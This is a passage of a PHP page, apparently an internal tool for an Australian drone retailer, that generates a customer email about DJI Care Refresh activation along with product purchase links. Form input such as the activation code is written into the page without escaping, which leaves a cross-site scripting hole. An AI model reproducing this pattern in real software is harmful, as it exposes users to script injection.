                    $mainString = $mainString . "\n" . "Go to DJI website https://store.dji.com/dji_care_infos/active and your serial number from your drone and activation key '" . $_POST["carerefreshcode3"] . "'.";
                }
                if (!empty($_POST["carerefreshcode1"]) && isset($_POST["carerefreshcode2"]) && isset($_POST["carerefreshcode3"])) {
                    $mainString = $mainString . "\n" . "Ensure that your location is set to Australia (English / $ AUD) in order to activation your Care Refresh in the correct region.";
                }

                //If no codes are entered
                if (empty($_POST["carerefreshcode1"]) && empty($_POST["carerefreshcode2"]) && empty($_POST["carerefreshcode3"])){
                    $mainString = $mainString . "\n" . "
Take note to activate your DJI Care Refresh within 48 hours of activating your DJI product for the first time.
Go to DJI website https://store.dji.com/dji_care_infos/active and your serial number from your drone and activation key of the DJI Care Refresh.
Ensure that your location is set to Australia (English / $ AUD) in order to activation your Care Refresh in the correct region.";
                }

                //If no care refresh purchased
            }else if ($_POST["carerefresh"] == "no"){
                $mainString = $mainString . "\n" . "
It’s not too late to purchase the DJI Care Refresh insurance for you drone.
The Care Refresh insurance protects against non-warranty damage to your drone, such as bumps, scratches and rainy weather.
You can purchase and apply insurance to your drone within 48 hours of activating your drone.
Learn more here:";

                //Add links to care refresh
                if(!empty($_POST['check_list'])) {


                    foreach($_POST['check_list'] as $check) {
                        if ($check == "spark"){
                            $mainString = $mainString . "\n" . "https://www.d1store.com.au/products/SPARK-CARE-REFRESH \nhttps://www.d1store.com.au/products/SPARK-CARE-REFRESH-COMBO";
                         
                        }
                        if ($check == "mavicpro") {
                            $mainString = $mainString . "\n" . "https://www.d1store.com.au/products/dji-care-refresh-mavic-pro";
                            $drone_in_sale = true;
                        }
                        if ($check == "p4a") {
                            $mainString = $mainString . "\n" . "https://www.d1store.com.au/products/dji-care-refresh-phantom-4-advanced";
                            $drone_in_sale = true;
                        }
                        if ($check == "p4p") {
                            $mainString = $mainString . "\n" . "https://www.d1store.com.au/products/dji-care-refresh-phantom-4-pro";
                            $drone_in_sale = true;
                        }
                        if ($check == "p4pp") {
                            $mainString = $mainString . "\n" . "https://www.d1store.com.au/products/dji-care-refresh-phantom-4-pro";
                            $drone_in_sale = true;
                        }
                        if ($check == "inspire2") {
                            $mainString = $mainString . "\n" . "https://www.d1store.com.au/products/dji-care-refresh-inspire-2";
                            $drone_in_sale = true;
                        }
                    }
                }
            }
        }

        $drone_only_info = "Find out the Australian rules for drone flight using the CASA official app: Can I Fly There?
Learn more here: https://www.casa.gov.au/droneapp
 
Take some time to learn more about the dos and don’ts of drone flight with this easy guide: 
http://lounge.d1store.com.au/content/the-dos-and-don-ts-of-drone-flying
 
If you require further assistance then please don’t hesitate to send us an email or give us a call.";

        if($drone_in_sale){
            $mainString = $mainString . "\n\n" . $drone_only_info;
        }



?>




<div class="row">
<h2 class="col-md-6">GENERATED EMAIL:</h2><div class="col-md-6 btn btn-outline-info" id="copy">COPY TO CLIPBOARD</div>
</div>
<script>
$("#copy").click(function(){
    $("#generatedOutput").select();
    document.execCommand('copy');
	
});
</script>
<?php
        //Output text area
        if(isset($_POST)){
            echo '<br><textarea id="generatedOutput" class="form-control" rows="30" name="comment">' . $mainString . '</textarea></br>';
        }
        ?>
    </form>
	
   
    
	</div>
	
	
	 <footer class="">
      <div class="container">
        <h3>If any changes are required, please contact Michael and Andrey.</h3>
      </div>
    </footer>
</body>
</html>

